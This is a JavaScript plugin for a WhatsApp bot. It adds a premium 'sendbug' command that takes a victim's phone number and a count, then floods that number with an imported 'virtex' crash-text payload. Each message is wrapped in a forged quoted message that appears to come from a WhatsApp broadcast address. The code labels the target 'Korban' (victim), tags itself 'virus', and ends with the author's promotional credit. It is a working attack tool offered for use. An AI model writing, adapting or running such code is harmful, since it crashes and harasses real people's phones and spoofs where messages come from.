import virtex from "../virtex/index.js";

let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) => {
    if (!(isOwner || isPrems)) {
        global.dfail('premium', m, conn)
        throw false
    }
    if (!text) throw `uhm... siapa yg mau diserang?\n contoh penggunaan:\n *${usedPrefix + command}* nomor\n Example: *${usedPrefix + command}* 6281234567890`;
    let [orang, jumlah] = text.split(',')
    if (!jumlah) throw 'masukan jumlah nya.\n\nContoh\n.sbug 62882...., 10'
    m.reply('_sedang diproses..._')
    let who
    try {
        if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : orang.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        else who = orang.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        if (who.length <= 20) throw 'balas atau tag orang yg mau di serang!';
        conn.logger.info(`\nKorban: ${who}\nJumlah: ${jumlah}`)
        for (let i = jumlah; i > 1; i--) {
            if (i !== 0) await conn.sendMessage(who, { text: virtex }, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: '0@s.whatsapp.net',
                        remoteJid: '0@s.whatsapp.net@broadcast'
                    },
                    message: {
                        conversation: virtex
                    }
                }
            })
        }
        conn.reply(m.chat, `sukses mengirim bug ke @${who.split('@')[0]}`, m, { mentions: [who] })
    } catch (e) {
        console.error(e)
        throw e
    }
}
handler.help = ['sendbug', 'sbug'].map(v => v + ' <nomor>')
handler.tags = ['premium', 'virus']
handler.command = /^s(end)?bug$/i

handler.premium = true

export default handler















/**
 * Jangan Di Hapus!!
 * 
 * Buatan @FokusDotId (Fokus ID)
 * Github: https://github.com/fokusdotid
 * 
 * Ingin bikin fitur tapi tidak bisa coding?
 * hubungi: https://wa.me/6281320170984
 * 
 */